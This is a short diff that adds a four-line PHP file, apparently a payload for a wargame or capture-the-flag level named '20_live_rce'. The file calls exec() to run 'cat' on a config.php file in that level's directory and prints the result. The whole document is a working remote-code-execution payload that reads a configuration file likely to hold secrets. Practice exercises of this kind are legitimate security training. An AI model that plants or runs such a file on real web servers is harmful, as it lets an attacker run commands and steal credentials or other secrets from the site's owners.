@@ -1,0 +1,4 @@
+<?php
+exec("cat /home/level/20_live_rce/config.php",$out);
+print_r($out);
+?>
